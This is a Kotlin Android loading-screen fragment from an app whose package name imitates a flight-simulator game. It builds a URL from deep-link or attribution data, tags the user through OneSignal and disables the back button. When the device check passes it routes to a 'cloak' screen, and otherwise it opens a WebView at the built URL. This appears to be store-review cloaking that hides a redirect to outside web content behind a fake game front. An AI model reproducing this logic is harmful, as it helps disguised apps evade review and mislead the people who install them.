package it.rortos.realflig.ui.fragments

import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.activity.OnBackPressedCallback
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material.CircularProgressIndicator
import androidx.compose.material.Surface
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.ComposeView
import androidx.compose.ui.res.painterResource
import androidx.core.os.bundleOf
import androidx.fragment.app.Fragment
import androidx.fragment.app.viewModels
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import dagger.hilt.android.AndroidEntryPoint
import it.rortos.realflig.R
import it.rortos.realflig.ui.viewmodel.AztecViewModel
import it.rortos.realflig.util.OneSignalTagSender
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

@AndroidEntryPoint
class LoadingFragment : Fragment() {
    private val viewModel: AztecViewModel by viewModels()
    lateinit var url: String
    private var savedUrl: String? = null
    private val tagSender = OneSignalTagSender()
    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        Log.d("myTag", " started Loading Fragment")
        return ComposeView(requireContext()).apply {
            setContent {
                Surface {
                    Image(
                        painter = painterResource(id = R.drawable.loading_screen),
                        contentDescription = "loading",
                        contentScale = ContentScale.FillHeight,
                        modifier = Modifier.fillMaxSize()
                    )
                    Box(
                        modifier = Modifier.fillMaxSize(),
                        contentAlignment = Alignment.Center
                    ) {
                        CircularProgressIndicator()
                    }
                    LaunchedEffect(key1 = true) {
                        launch(Dispatchers.IO) {
                            savedUrl = viewModel.getAllFromDb()?.savedUrl
                            Log.d("myTag", "this is saved url $savedUrl")
                            if (savedUrl == null) {
                                viewModel.collectDeepFlow(requireActivity()).collect { deepLink ->
                                    if (deepLink != "null") {
                                        url = viewModel.buildUrl(deepLink, null, requireActivity())
                                        tagSender.makeTag(deepLink, null)
                                        lifecycleScope.launch(Dispatchers.Main) {
                                            whereToNavigate(url)
                                        }
                                    } else {
                                        viewModel.collectAppsData(requireActivity())
                                            .collect { data ->
                                                Log.d("YYY", data.toString())
                                                url = viewModel.buildUrl(
                                                    "null",
                                                    data,
                                                    requireActivity()
                                                )
                                                tagSender.makeTag("null", data)
                                                lifecycleScope.launch(Dispatchers.Main) {
                                                    whereToNavigate(url)
                                                }
                                            }
                                    }
                                }
                            } else {
                                url = savedUrl.toString()
                                lifecycleScope.launch(Dispatchers.Main) {
                                    whereToNavigate(url)
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        requireActivity().onBackPressedDispatcher.addCallback(
            object : OnBackPressedCallback(false) {
                override fun handleOnBackPressed() {}
            })
    }

    private fun whereToNavigate(url: String) {
        if (viewModel.isDeviceSecured(requireActivity())) {
            navigateToCloak()
            Log.d("myTag", "navigated to cloak")
        } else {
            navigateToWeb(url)
            Log.d("myTag", " navigated to web with this url: $url")
        }
    }

    private fun navigateToWeb(arg: String) {
        with(bundleOf("url" to arg)) {
            findNavController().navigate(R.id.webFragment, this)
        }
    }

    private fun navigateToCloak() {
        findNavController().navigate(R.id.cloakFragment)
    }
}